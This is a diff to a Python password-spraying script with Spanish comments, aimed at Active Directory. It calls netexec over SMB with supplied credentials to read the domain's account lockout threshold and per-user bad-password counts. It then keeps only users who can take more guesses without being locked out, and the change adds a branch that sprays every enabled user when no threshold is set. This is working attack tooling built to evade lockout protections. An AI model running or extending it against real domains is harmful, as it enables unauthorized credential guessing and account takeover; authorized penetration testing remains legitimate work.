@@ -8,7 +8,6 @@ import sys
 import logging
 
 # Configuración inicial de logging: mostramos logs a partir de INFO
-# El formato es personalizable; aquí mostramos nivel y mensaje.
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 logger = logging.getLogger(__name__)
 
@@ -48,6 +47,9 @@ def get_account_lockout_threshold(dc_ip, username, password, domain):
     Ejecuta netexec para extraer el account lockout threshold del dominio.
     Se asume que la salida contiene una línea similar a:
       "Account lockout threshold: 5"
+    o
+      "Account lockout threshold: None"
+    Esta función captura cualquier valor que siga a los dos puntos y, si es numérico, lo retorna como entero.
     """
     cmd = f"nxc smb {dc_ip} -u {username} -p {password} -d {domain} --pass-pol"
     try:
@@ -56,9 +58,13 @@ def get_account_lockout_threshold(dc_ip, username, password, domain):
         logger.error("Error ejecutando netexec para obtener la política de lockout: %s", e)
         sys.exit(1)
     
-    match = re.search(r'(?i)Account\s+Lockout\s+Threshold\s*:\s*(\d+)', result.stdout)
+    match = re.search(r'(?i)Account\s+Lockout\s+Threshold\s*:\s*(.*)', result.stdout)
     if match:
-        return int(match.group(1))
+        value = match.group(1).strip()
+        try:
+            return int(value)
+        except ValueError:
+            return value
     else:
         logger.error("No se pudo obtener el Account lockout threshold del dominio.")
         sys.exit(1)
@@ -152,35 +158,42 @@ def main():
     if not args.p and not (args.user_as_pass_low or args.user_as_pass_up):
         parser.error("Debe especificar una contraseña de spray con -p o una opción --user-as-pass (--user-as-pass-low o --user-as-pass-up)")
 
+    # Si se proporcionan las credenciales para netexec, primero comprobamos el Account Lockout Threshold
     if args.ul and args.pl:
-        logger.info("[*] Obteniendo la lista de usuarios y su BadPW con netexec...")
-        netexec_users = get_netexec_users(args.dc_ip, args.ul, args.pl, args.d)
-        if not netexec_users:
-            logger.error("No se obtuvieron usuarios de netexec.")
-            sys.exit(1)
-
-        logger.info("[*] Leyendo lista de usuarios habilitados...")
-        enabled_users = read_enabled_users(args.u)
-
-        filtered_users = [(user, badpw) for user, badpw in netexec_users if user in enabled_users]
-        if not filtered_users:
-            logger.error("No hay usuarios habilitados en la lista de netexec.")
-            sys.exit(1)
-
         logger.info("[*] Obteniendo Account lockout threshold del dominio...")
         account_threshold = get_account_lockout_threshold(args.dc_ip, args.ul, args.pl, args.d)
         logger.info(f"[*] Account lockout threshold obtenido: {account_threshold}")
 
-        eligible_users = []
-        for user, badpw in filtered_users:
-            remaining = account_threshold - badpw
-            if remaining > args.t:
-                eligible_users.append(user)
-            else:
-                logger.debug(f"[-] Usuario {user} no es elegible para spray. BadPW: {badpw}, intentos restantes: {remaining}")
-        if not eligible_users:
-            logger.info("No hay usuarios elegibles para password spraying según el threshold seguro.")
-            sys.exit(0)
+        if isinstance(account_threshold, int):
+            logger.info("[*] Umbral configurado, obteniendo la lista de usuarios y su BadPW con netexec...")
+            netexec_users = get_netexec_users(args.dc_ip, args.ul, args.pl, args.d)
+            if not netexec_users:
+                logger.error("No se obtuvieron usuarios de netexec.")
+                sys.exit(1)
+
+            logger.info("[*] Leyendo lista de usuarios habilitados...")
+            enabled_users = read_enabled_users(args.u)
+            filtered_users = [(user, badpw) for user, badpw in netexec_users if user in enabled_users]
+            if not filtered_users:
+                logger.error("No hay usuarios habilitados en la lista de netexec.")
+                sys.exit(1)
+
+            eligible_users = []
+            for user, badpw in filtered_users:
+                remaining = account_threshold - badpw
+                if remaining > args.t:
+                    eligible_users.append(user)
+                else:
+                    logger.debug(f"[-] Usuario {user} no es elegible para spray. BadPW: {badpw}, intentos restantes: {remaining}")
+            if not eligible_users:
+                logger.info("No hay usuarios elegibles para password spraying según el threshold seguro.")
+                sys.exit(0)
+        else:
+            logger.info("[*] No se configuró un umbral de bloqueo (valor obtenido: '%s'), se usarán todos los usuarios sin filtrar por BadPW.", account_threshold)
+            eligible_users = list(read_enabled_users(args.u))
+            if not eligible_users:
+                logger.error("La lista de usuarios proporcionada está vacía.")
+                sys.exit(1)
     else:
         logger.info("[*] No se proporcionó autenticación para netexec, se usará la lista de usuarios directamente.")
         eligible_users = list(read_enabled_users(args.u))
